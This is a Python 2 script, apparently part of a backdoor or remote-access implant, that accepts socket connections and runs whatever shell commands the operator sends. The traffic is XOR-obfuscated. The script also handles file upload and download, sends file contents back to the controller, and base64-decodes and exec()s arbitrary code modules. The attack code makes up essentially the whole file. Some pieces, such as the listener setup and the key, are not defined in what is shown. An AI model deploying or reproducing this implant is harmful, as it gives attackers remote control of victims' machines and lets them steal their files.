#!/usr/bin/env python
#!/usr/bin/env python
import os, sys, re, signal
import socket
import time
from base64 import *
from subprocess import Popen,PIPE,STDOUT,call
import platform

socksize = 4096                            
activePID = []
Home_Dir = os.environ['HOME']
if os.geteuid() != 0:
    currentuser = "nonroot"
else:
    currentuser = "root"


def xor(string, key):
    data = ''
    for char in string:
        for ch in key:
            char = chr(ord(char) ^ ord(ch))
        data += char
    return data


def module_handler(module, modname):
    status_msg("[~] Module: %s\n" % modname)
    exec(module)
    connection.send("shell => ")


def status_msg(message):
    connection.send("%s" % message)


def cat_file(filename):
    if os.path.exists(filename) and os.access(filename, os.R_OK):
        catfile = open(filename, "rb")
        connection.send("[*] Contents of %s" % filename)
        for lines in catfile.readlines():
            connection.sendall(lines)
        catfile.close()


def save_file(filename):
    if os.path.exists(filename) and os.access(filename, os.R_OK):
        savefile = open(filename, "rb")
        filedata = savefile.read()
        savefile.close()
        connection.send(":savef %s" % filename)
        time.sleep(2)
        connection.sendall( filedata )
    else:
        pass


def cmd_exec(command):
    proc = Popen(command,
              shell=True,
              stdout=PIPE,
              stderr=PIPE,
               stdin=PIPE,
               )
    stdout, stderr = proc.communicate()
    connection.sendall( stdout )


def cmd2txt(command, textfile):
    os.system("%s > %s" % (command, textfile))
    save_file(textfile)
    os.system("rm %s" % textfile)


def reaper():                              
    while activePID:                        
        pid,stat = os.waitpid(0, os.WNOHANG)     
        if not pid: break
        activePID.remove(pid)


def handler(connection):                    
    time.sleep(2)     
                          
    while True:                                     
        cmd = xor(connection.recv(socksize), pin)
        proc = Popen(cmd,
             shell=True,
             stdout=PIPE,
             stderr=PIPE,
             stdin=PIPE,
             )
        stdout, stderr = proc.communicate()

        if cmd.startswith('cd'):
            try:
                destination = cmd[3:].replace('\n','')
                if os.path.isdir(destination):
                    os.chdir(destination)
                    current = os.getcwd()
                    connection.send("[*] current directory: %s" % current)
                    connection.send("shell => ")
                else:
                    connection.send("[!] Directory does not exist") 
                    connection.send("shell => ")
            except IndexError:
                pass

        if cmd.startswith(":upload"):
            getname = cmd.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            filedata = connection.recv(socksize)
            filedata = xor(filedata, pin)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                connection.send(xor("[~] File upload complete!\n", pin))
            if not os.path.isfile(filename):
                connection.send(xor("[!] File upload failed! Please try again\n", pin))

        elif cmd.startswith(":download"):
            getname = cmd.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                senddata = xor(filedata, pin)
                connection.sendall(senddata)
            else:
                connection.send(xor("[!] File not found!", pin))
    
        elif cmd.startswith(":exec"):
            try:
                getname = cmd.split(" ")
                modname = getname[1]
    
                mod_data = ""
                data = connection.recv(socksize)
                mod_data += data
                connection.send(xor("Complete", pin))
                modexec = b64decode(mod_data)
                module_handler(modexec, modname)

            except IndexError:
                pass

        elif cmd == (":quit"):
            conn.close()
            os._exit(0)
            sys.exit(0)

        elif proc:
            connection.send(xor( stdout , pin))
            connection.send(xor("shell => ", pin))

    connection.close() 
    os._exit(0)


def accept():                                
    while 1:   
        global connection                                  
        connection, address = conn.accept()
        connection.send(xor("shell => ", pin))
        reaper()
        childPid = os.fork()
        if childPid == 0:
            handler(connection)
        else:
            activePID.append(childPid)


